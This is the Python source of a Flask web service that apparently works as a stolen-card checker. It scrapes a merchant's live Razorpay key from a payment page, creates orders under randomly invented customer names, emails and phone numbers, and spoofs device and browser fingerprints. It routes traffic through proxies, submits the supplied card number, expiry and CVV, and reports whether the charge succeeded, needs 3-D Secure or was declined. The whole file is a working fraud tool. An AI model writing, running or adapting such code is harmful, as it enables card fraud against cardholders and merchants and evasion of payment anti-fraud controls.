from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import random
import time
import re

app = Flask(__name__)
CORS(app)

def get_proxy(proxy_str):
    if not proxy_str:
        return None
    parts = proxy_str.split(':')
    if len(parts) == 4:
        ip, port, user, pwd = parts
        return {
            "http": f"http://{user}:{pwd}@{ip}:{port}",
            "https": f"http://{user}:{pwd}@{ip}:{port}"
        }
    elif len(parts) == 2:
        ip, port = parts
        return {
            "http": f"http://{ip}:{port}",
            "https": f"http://{ip}:{port}"
        }
    return None

def get_headers(referer=None):
    return {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-PH,en-US;q=0.9,en;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/json",
        "Origin": "https://pages.razorpay.com",
        "Referer": referer or "https://pages.razorpay.com/",
        "Sec-Ch-Ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
        "Sec-Ch-Ua-Mobile": "?1",
        "Sec-Ch-Ua-Platform": '"Android"',
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
    }

def extract_merchant_info(site_url, proxies=None):
    try:
        session = requests.Session()
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-PH,en-US;q=0.9,en;q=0.8",
        }
        resp = session.get(site_url, headers=headers, proxies=proxies, timeout=30)
        html = resp.text

        key_id = None
        key_match = re.search(r'rzp_live_[A-Za-z0-9]+', html)
        if key_match:
            key_id = key_match.group(0)

        pl_match = re.search(r'pl_[A-Za-z0-9]+', site_url)
        payment_link_id = pl_match.group(0) if pl_match else None

        ppi_match = re.search(r'ppi_[A-Za-z0-9]+', html)
        payment_page_item_id = ppi_match.group(0) if ppi_match else None

        kh_match = re.search(r'keyless_header["\s:=]+([^\s"&,]+)', html)
        keyless_header = kh_match.group(1) if kh_match else None

        amount_match = re.search(r'"amount"\s*:\s*(\d+)', html)
        amount_paise = int(amount_match.group(1)) if amount_match else 50000

        return {
            "key_id": key_id,
            "payment_link_id": payment_link_id,
            "payment_page_item_id": payment_page_item_id,
            "keyless_header": keyless_header,
            "amount_paise": amount_paise,
            "session": session,
        }
    except Exception as e:
        return {"error": str(e)}

def create_order(merchant, site_url, proxies=None, session=None):
    try:
        payment_link_id = merchant.get("payment_link_id")
        payment_page_item_id = merchant.get("payment_page_item_id")
        amount_paise = merchant.get("amount_paise", 50000)

        url = f"https://api.razorpay.com/v1/payment_pages/{payment_link_id}/order"

        user_info = {
            "name": random.choice(["Raj Kumar", "Priya Singh", "Amit Sharma", "Neha Gupta"]),
            "email": f"user{random.randint(100,9999)}@gmail.com",
            "phone": f"+91{random.randint(7000000000, 9999999999)}"
        }

        payload = {
            "line_items": [{
                "payment_page_item_id": payment_page_item_id,
                "amount": amount_paise
            }],
            "notes": {
                "name": user_info["name"],
                "email": user_info["email"],
                "phone": user_info["phone"]
            }
        }

        headers = get_headers(site_url)
        headers["Host"] = "api.razorpay.com"
        headers["Origin"] = "https://pages.razorpay.com"

        resp = (session or requests).post(
            url, json=payload, headers=headers,
            proxies=proxies, timeout=30
        )
        data = resp.json()
        return {
            "order_id": data.get("id"),
            "amount": data.get("amount", amount_paise),
            "user_info": user_info,
        }
    except Exception as e:
        return {"error": str(e)}

def submit_payment(merchant, order_data, card, proxies=None, session=None):
    try:
        key_id = merchant.get("key_id")
        keyless_header = merchant.get("keyless_header")
        payment_link_id = merchant.get("payment_link_id")
        order_id = order_data.get("order_id")
        amount = order_data.get("amount")
        user_info = order_data.get("user_info", {})

        cc, mes, ano, cvv = card.split("|")
        if len(ano) == 2:
            ano = "20" + ano

        device_id = f"1.{random.randint(10000000,99999999)}c6a30cf49d7559d6e9c{random.randint(1000000,9999999)}.{int(time.time()*1000)}.{random.randint(10000000,99999999)}"

        url = "https://api.razorpay.com/v1/standard_checkout/payments/create/ajax"

        params = {
            "key_id": key_id,
            "session_token": f"{random.randint(10000000,99999999)}CA{random.randint(10000,99999)}C01C7EC3B67DCC99D53DE6CE0AF7B5280B071",
            "keyless_header": keyless_header or ""
        }

        payload = {
            "notes[name]": user_info.get("name", "Test User"),
            "notes[email]": user_info.get("email", "test@gmail.com"),
            "notes[phone]": user_info.get("phone", "+919876543210"),
            "payment_link_id": payment_link_id,
            "key_id": key_id,
            "contact": user_info.get("phone", "+919876543210"),
            "email": user_info.get("email", "test@gmail.com"),
            "currency": "INR",
            "_[integration]": "payment_pages",
            "_[checkout_id]": f"T{random.randint(10000000,99999999)}Xt",
            "_[device_id]": device_id,
            "_[library]": "checkoutjs",
            "_[library_src]": "no-src",
            "_[current_script_src]": "no-src",
            "_[platform]": "browser",
            "_[env]": "",
            "_[is_magic_script]": "false",
            "_[os]": "android",
            "_[referer]": f"https://pages.razorpay.com/{payment_link_id}/view",
            "_[shield][hash]": f"{random.randbytes(16).hex()}",
            "_[shield][tz]": "480",
            "_[build]": str(random.randint(20000000, 30000000)),
            "_[request_index]": "0",
            "amount": str(amount),
            "order_id": order_id,
            "method": "card",
            "card[number]": cc,
            "card[cvv]": cvv,
            "card[expiry_month]": mes.zfill(2),
            "card[expiry_year]": ano[-2:],
            "save": "0"
        }

        headers = get_headers(f"https://api.razorpay.com/v1/checkout/public?")
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        headers["Host"] = "api.razorpay.com"
        headers["Origin"] = "https://api.razorpay.com"

        resp = (session or requests).post(
            url, data=payload, params=params,
            headers=headers, proxies=proxies, timeout=60
        )

        try:
            return resp.json()
        except:
            return {"error": resp.text[:200], "status_code": resp.status_code}

    except Exception as e:
        return {"error": str(e)}

@app.route('/razorpay_parallel', methods=['GET'])
def razorpay_check():
    start_time = time.time()

    site = request.args.get('site', '')
    cc = request.args.get('cc', '')
    proxy_str = request.args.get('proxy', '')

    if not site or not cc:
        return jsonify({"error": "Missing site or cc parameter"}), 400

    if len(cc.split('|')) != 4:
        return jsonify({"error": "Invalid CC format. Use: CC|MM|YY|CVV"}), 400

    proxies = get_proxy(proxy_str) if proxy_str else None

    merchant = extract_merchant_info(site, proxies)
    if "error" in merchant:
        return jsonify({
            "Gateway": "RAZORPAY",
            "Status": False,
            "Response": merchant["error"],
            "cc": cc,
            "time": round(time.time() - start_time, 2)
        })

    session = merchant.get("session")

    order_data = create_order(merchant, site, proxies, session)
    if "error" in order_data or not order_data.get("order_id"):
        return jsonify({
            "Gateway": "RAZORPAY",
            "Status": False,
            "Response": order_data.get("error", "Failed to create order"),
            "cc": cc,
            "time": round(time.time() - start_time, 2)
        })

    amount_inr = round(order_data.get("amount", 50000) / 100, 2)

    payment_resp = submit_payment(merchant, order_data, cc, proxies, session)

    payment_id = payment_resp.get("payment_id") or payment_resp.get("razorpay_payment_id")
    next_action = payment_resp.get("next", {})
    error = payment_resp.get("error", {})

    if payment_id:
        status = True
        response_msg = "PAYMENT_SUCCESS"
    elif next_action:
        action_type = next_action.get("action", "")
        if "3ds" in action_type.lower() or "redirect" in action_type.lower():
            status = False
            response_msg = "3DS_REQUIRED"
        else:
            status = False
            response_msg = str(next_action)
    elif error:
        status = False
        response_msg = error.get("description") or error.get("code") or str(error)
    else:
        status = False
        response_msg = str(payment_resp)[:100]

    return jsonify({
        "Gateway": "RAZORPAY",
        "Price": round(amount_inr / 83.5, 2),
        "Response": response_msg,
        "Status": status,
        "amount_inr": amount_inr,
        "cc": cc,
        "masked": f"{cc[:6]}******{cc.split('|')[0][-4:]}",
        "order_id": order_data.get("order_id"),
        "payment_id": payment_id,
        "time": round(time.time() - start_time, 2)
    })

@app.route('/', methods=['GET'])
def index():
    return jsonify({"status": "RazorPay API Running", "version": "1.0"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
